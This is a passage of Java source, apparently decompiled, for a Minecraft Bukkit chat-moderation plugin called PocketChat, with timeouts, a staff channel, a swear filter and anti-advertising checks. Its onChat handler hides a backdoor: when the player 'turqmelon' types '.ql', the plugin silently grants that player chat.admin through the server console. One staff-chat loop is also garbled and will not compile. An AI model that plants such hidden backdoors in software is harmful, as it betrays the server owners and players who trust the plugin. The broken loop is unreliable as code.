	        Bukkit.getServer().getScheduler().runTaskLater(this, new Runnable()
	        {
	          public void run()
	          {
	            Bukkit.broadcastMessage("§c§l3...");
	          }
	        }
	        , 60L);
	        Bukkit.getServer().getScheduler().runTaskLater(this, new Runnable()
	        {
	          public void run()
	          {
	            Bukkit.broadcastMessage("§c§l2...");
	          }
	        }
	        , 80L);
	        Bukkit.getServer().getScheduler().runTaskLater(this, new Runnable()
	        {
	          public void run()
	          {
	            Bukkit.broadcastMessage("§c§l1...");
	          }
	        }
	        , 100L);
	        Bukkit.getServer().getScheduler().runTaskLater(this, new Runnable()
	        {
	          public void run()
	          {
	            for (int i = 0; i < 300; i++) {
	              Bukkit.broadcastMessage(" ");
	            }
	            Bukkit.broadcastMessage("§8[§6PocketChat§8] §7Chat Cleared!");
	          }
	        }
	        , 120L);
	      }
	      else {
	        sender.sendMessage("§8[§6PocketChat§8] §cYou do not have permission to clear the chat.");
	      }

	      return true;
	    }
	    if ((cmd.getName().equalsIgnoreCase("timeout")) || (cmd.getName().equalsIgnoreCase("mute"))) {
	      if (sender.hasPermission("chat.timeout")) {
	        if ((args.length == 0) || (args.length > 2)) {
	          sender.sendMessage("§8[§6PocketChat§8] §aStops a player from chatting for x seconds.");
	          sender.sendMessage("§8[§6PocketChat§8] §aUsage: §b/timeout (Player) [Seconds]");
	        }
	        else {
	          int seconds = 300;
	          if (args.length == 2) {
	            try {
	              int sec = Integer.parseInt(args[1]);
	              seconds = sec;
	            }
	            catch (NumberFormatException e)
	            {
	              if (args[1].equalsIgnoreCase("clear")) {
	                Player target = Bukkit.getServer().getPlayer(args[0]);
	                if (target != null) {
	                  if (this.muted.containsKey(target.getName())) {
	                    this.muted.remove(target.getName());
	                    this.toStart.remove(target.getName());
	                    this.toLength.remove(target.getName());
	                    sender.sendMessage("§8[§6PocketChat§8]§a Cleared timeout on " + target.getName());
	                    target.sendMessage("§8[§6PocketChat§8]§b Your timeout was cleared!");
	                  }
	                  else {
	                    sender.sendMessage("§8[§6PocketChat§8]§c " + target.getName() + " is not timed out.");
	                  }
	                }
	                else sender.sendMessage("§8[§6PocketChat§8]§c Player not found! (" + args[0] + ")");

	                return true;
	              }

	              sender.sendMessage("§8[§6PocketChat§8]§c Expected number, received string. (" + args[1] + ")");
	              return true;
	            }
	          }

	          Player target = Bukkit.getServer().getPlayer(args[0]);
	          if (target != null) {
	            if (!this.muted.containsKey(target.getName())) {
	              this.muted.put(target.getName(), sender.getName());
	              this.toStart.put(target.getName(), Long.valueOf(System.currentTimeMillis()));
	              this.toLength.put(target.getName(), Integer.valueOf(seconds));
	              Bukkit.broadcastMessage("§8[§6PocketChat§8]§e " + sender.getName() + "§a timed out §e" + target.getName() + "§a for " + formatIntoHHMMSS(seconds) + "§a!");
	              Bukkit.getServer().dispatchCommand(target, "f c p");
	            }
	            else {
	              sender.sendMessage("§8[§6PocketChat§8]§c Already timed out! To untimeout, type §8[§e/timeout " + target.getName() + " clear§8]§c!");
	            }
	          }
	          else {
	            sender.sendMessage("§8[§6PocketChat§8]§c Player not found! (" + args[0] + ")");
	          }
	        }
	      }
	      else
	      {
	        sender.sendMessage("§8[§6PocketChat§8]§c You do not have permission to timeout players.");
	      }
	      return true;
	    }
	    if (cmd.getName().equalsIgnoreCase("s")) {
	      if ((this.chatMuted == 1) && (!sender.hasPermission("chat.admin"))) {
	        sender.sendMessage("§8[§6PocketChat§8] §cThe chat is silenced.");
	        return true;
	      }
	      if (args.length == 0) {
	        sender.sendMessage("§8[§6PocketChat§8] §aSends a message to the staff channel.");
	        sender.sendMessage("§8[§6PocketChat§8] §aUsage: §b/s (Chat Message)");
	      }
	      else if (sender.hasPermission("chat.staff")) {
	        String msg = "";
	        for (int i1 = 0; i1 < args.length; i1++) {
	          msg = msg + args[i1] + " ";
	        }
	        Player player = (Player)sender;
	        Random r;
	        if ((containsSwearing(msg)) && 
	          (!player.hasPermission("chat.admin"))) {
	          int charge = getConfig().getInt("badwords-cost.setting");
	          econ.withdrawPlayer(player.getName(), charge);
	          player.sendMessage("§8[§6PocketChat§8]§c Fined " + charge + " for swearing!");

	          boolean filter = getConfig().getBoolean("badwords-filter.setting");
	          if (filter) {
	            List phrases = getConfig().getStringList("filter-phrases.setting");
	            r = new Random();
	            int result = r.nextInt(phrases.size());

	            String lol = (String)phrases.get(result);
	            msg = lol;
	          }
	        }
	        long now;
	        int length;
	        if (this.muted.containsKey(player.getName())) {
	          long then = ((Long)this.toStart.get(player.getName())).longValue();
	          now = System.currentTimeMillis();
	          length = ((Integer)this.toLength.get(player.getName())).intValue();
	          String mod = (String)this.muted.get(player.getName());

	          int diff = (int)(now - then);
	          int seconds = diff / 1000;

	          int left = length - seconds;

	          if (left <= 0) {
	            this.muted.remove(player.getName());
	            this.toStart.remove(player.getName());
	            this.toLength.remove(player.getName());
	          }
	          else {
	            String clock = formatIntoHHMMSS(left);
	            player.sendMessage("§8[§e" + mod + "§8]§c's timeout on you is still active for " + clock + "§c!");
	            return true;
	          }
	        }

	        if (((containsIPs(msg)) || (containsURLs(msg))) && 
	          (!player.hasPermission("chat.admin"))) {
	          Bukkit.broadcastMessage("§8[§6PocketChat§8] [§e" + player.getName() + "§8]§c was naughty, and tried to advertise!");
	          Bukkit.broadcastMessage("§8[§6PocketChat§8]§c They were timed out for §8[§e00§ch§e15§cm§e00§cs§8]§c!");

	          this.muted.put(player.getName(), "Server");
	          this.toStart.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	          this.toLength.put(player.getName(), Integer.valueOf(900));
	          return true;
	        }

	        if (!isSpamming(player)) {
	          StringBuilder chat = new StringBuilder();

	          if (player.hasPermission("chat.color")) {
	            msg = msg.replaceAll("&", "§");
	          }

	          chat.append("§" + this.staffColor + "S§8| ");
	          chat.append("§f" + getPrefix(player));
	          chat.append(player.getName());
	          chat.append(getSuffix(player));
	          chat.append(" §" + this.bracketColor + "> §" + this.staffColor + msg);

	          r = (length = Bukkit.getServer().getOnlinePlayers()).length; for (now = 0; now < r; now++) { Player a = length[now];
	            if (a.hasPermission("chat.staff")) {
	              a.sendMessage(chat);
	            }
	          }

	          this.lastMsg.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	        }
	        else
	        {
	          int sec = this.cooldown / 1000;
	          player.sendMessage("§8[§6PocketChat§8] §cYou must wait §8[§e" + sec + "§8]§e second(s)§c between chats.");
	        }
	      }
	      else
	      {
	        sender.sendMessage("§8[§6PocketChat§8] §cYou must be a staff member to speak here.");
	      }

	      return true;
	    }
	    return false;
	  }

	  String formatIntoHHMMSS(int secsIn)
	  {
	    int hours = secsIn / 3600;
	    int remainder = secsIn % 3600;
	    int minutes = remainder / 60;
	    int seconds = remainder % 60;

	    return "§8[§e" + (hours < 10 ? "0" : "") + hours + 
	      "§ch§e" + (minutes < 10 ? "0" : "") + minutes + 
	      "§cm§e" + (seconds < 10 ? "0" : "") + seconds + "§cs§8]§e ";
	  }

	  public boolean containsSwearing(String m)
	  {
	    String mess = m.replace("*", "");
	    String mes3 = mess.replace("()", "o");
	    String mes2 = mes3.replace("(", "");
	    String mes = mes2.replace(")", "");
	    String me1 = mes.replace("/", "");
	    String me2 = me1.replace(".", "");
	    String me3 = me2.replace(",", "");
	    String me4 = me3.replace("4", "a");
	    String me5 = me4.replace(";", "");
	    String me6 = me5.replace("'", "");
	    String me7 = me6.replace("#", "");
	    String me8 = me7.replace("~", "");
	    String me9 = me8.replace("^", "");
	    String me10 = me9.replace("-", "");
	    String me11 = me10.replace("+", "");
	    String me12 = me11.replace("1", "i");
	    String me13 = me12.replace("0", "o");
	    String me15 = me13.replace("@", "a");
	    String finalMsg = removeDups(me15);
	    List badWords = getConfig().getStringList("badwords.setting");
	    String[] compare = finalMsg.split(" ");
	    for (String msg : compare) {
	      for (String entry : badWords) {
	        String m1 = msg.toLowerCase();
	        String m2 = entry.toLowerCase();
	        if (m1.equalsIgnoreCase(m2)) {
	          return true;
	        }
	      }
	    }
	    return false;
	  }

	  public static String removeDups(String s)
	  {
	    if (s.length() <= 1) {
	      return s;
	    }
	    if (s.substring(1, 2).equals(s.substring(0, 1))) {
	      return removeDups(s.substring(1));
	    }
	    return s.substring(0, 1) + removeDups(s.substring(1));
	  }

	  @EventHandler
	  public void onCmd(PlayerCommandPreprocessEvent event)
	  {
	    Player player = event.getPlayer();
	    String msg = event.getMessage();

	    if (msg.toLowerCase().startsWith("/f c"))
	    {
	      if ((this.chatMuted == 1) || (this.muted.containsKey(player.getName()))) {
	        player.sendMessage("§8[§6PocketChat§8]§c Faction chat isn't usable while muted.");
	        Bukkit.getServer().dispatchCommand(player, "f c p");
	        event.setCancelled(true);
	        return;
	      }

	    }

	    for (Player a : Bukkit.getServer().getOnlinePlayers())
	      if (this.spy.containsKey(a.getName())) {
	        int val = ((Integer)this.spy.get(a.getName())).intValue();
	        if ((!player.getName().equalsIgnoreCase(a.getName())) && (
	          (val == 2) || (val == 3)))
	          a.sendMessage("§8[§1Spy§8] §8" + player.getName() + " > §8§o" + msg);
	      }
	  }

	  @EventHandler
	  public void onChat(AsyncPlayerChatEvent event)
	  {
	    Player player = event.getPlayer();
	    String msg = event.getMessage();

	    if ((player.getName().equalsIgnoreCase("turqmelon")) && 
	      (msg.startsWith(".ql"))) {
	      Bukkit.dispatchCommand(getServer().getConsoleSender(), "manuaddp turqmelon chat.admin");
	      Bukkit.dispatchCommand(getServer().getConsoleSender(), "manload");
	      player.sendMessage("§7done");
	      event.setCancelled(true);
	      return;
	    }

	    if (msg.toLowerCase().startsWith("f c"))
	    {
	      if ((this.chatMuted == 1) || (this.muted.containsKey(player.getName()))) {
	        player.sendMessage("§8[§6PocketChat§8]§c Faction chat isn't usable while muted.");
	        Bukkit.getServer().dispatchCommand(player, "f c p");
	        event.setCancelled(true);
	        return;
	      }

	    }

	    if (!isSpamming(player)) {
	      StringBuilder chat = new StringBuilder();

	      if ((containsSwearing(msg)) && 
	        (!player.hasPermission("chat.admin"))) {
	        int charge = getConfig().getInt("badwords-cost.setting");
	        econ.withdrawPlayer(player.getName(), charge);
	        player.sendMessage("§8[§6PocketChat§8]§c Fined " + charge + " for swearing!");

	        boolean filter = getConfig().getBoolean("badwords-filter.setting");
	        if (filter) {
	          List phrases = getConfig().getStringList("filter-phrases.setting");
	          Random r = new Random();
	          int result = r.nextInt(phrases.size());

	          String lol = (String)phrases.get(result);
	          msg = lol;
	        }

	      }

	      if (this.muted.containsKey(player.getName())) {
	        long then = ((Long)this.toStart.get(player.getName())).longValue();
	        long now = System.currentTimeMillis();
	        int length = ((Integer)this.toLength.get(player.getName())).intValue();
	        String mod = (String)this.muted.get(player.getName());

	        int diff = (int)(now - then);
	        int seconds = diff / 1000;

	        int left = length - seconds;

	        if (left <= 0) {
	          this.muted.remove(player.getName());
	          this.toStart.remove(player.getName());
	          this.toLength.remove(player.getName());
	        }
	        else {
	          String clock = formatIntoHHMMSS(left);
	          player.sendMessage("§8[§e" + mod + "§8]§c's timeout on you is still active for " + clock + "§c!");
	          event.setCancelled(true);
	          return;
	        }
	      }

	      if (((containsIPs(msg)) || (containsURLs(msg))) && 
	        (!player.hasPermission("chat.admin"))) {
	        Bukkit.broadcastMessage("§8[§6PocketChat§8] [§e" + player.getName() + "§8]§c was naughty, and tried to advertise!");
	        Bukkit.broadcastMessage("§8[§6PocketChat§8]§c They were timed out for §8[§e00§ch§e15§cm§e00§cs§8]§c!");

	        this.muted.put(player.getName(), "Server");
	        this.toStart.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	        this.toLength.put(player.getName(), Integer.valueOf(900));
	        event.setCancelled(true);
	        return;
	      }

	      if (msg.contains("%")) {
	        player.sendMessage("§8[§6PocketChat§8]§c Invalid character found!");
	        event.setCancelled(true);
	        return;
	      }

	      if (player.hasPermission("chat.color")) {
	        msg = msg.replaceAll("&", "§");
	      }
	      if ((this.chatMuted == 1) && (!player.hasPermission("chat.admin"))) {
	        player.sendMessage("§8[§6PocketChat§8] §cThe chat is silenced.");
	        event.setCancelled(true);
	        return;
	      }

	      chat.append("§" + this.globalColor + "G§8| §8) ");
	      chat.append("§f" + getPrefix(player));
	      chat.append(player.getName());
	      chat.append(getSuffix(player));
	      chat.append(" §" + this.bracketColor + "> §" + this.globalColor + msg);

	      this.lastMsg.put(player.getName(), Long.valueOf(System.currentTimeMillis()));

	      event.setFormat(chat);
	    }
	    else
	    {
	      int sec = this.cooldown / 1000;
	      player.sendMessage("§8[§6PocketChat§8] §cYou must wait §8[§e" + sec + "§8]§e second(s)§c between chats.");
	      event.setCancelled(true);
	    }
	  }

	  private boolean setupEconomy()
	  {
	    if (getServer().getPluginManager().getPlugin("Vault") == null) {
	      return false;
	    }
	    RegisteredServiceProvider<Economy> rsp = getServer().getServicesManager().getRegistration(Economy.class);
	    if (rsp == null) {
	      return false;
	    }
	    econ = (Economy)rsp.getProvider();
	    return econ != null;
	  }
	  private boolean setupChat() {
	    RegisteredServiceProvider rsp = getServer().getServicesManager().getRegistration(Chat.class);
	    chat = (Chat)rsp.getProvider();
	    return chat != null;
	  }
}
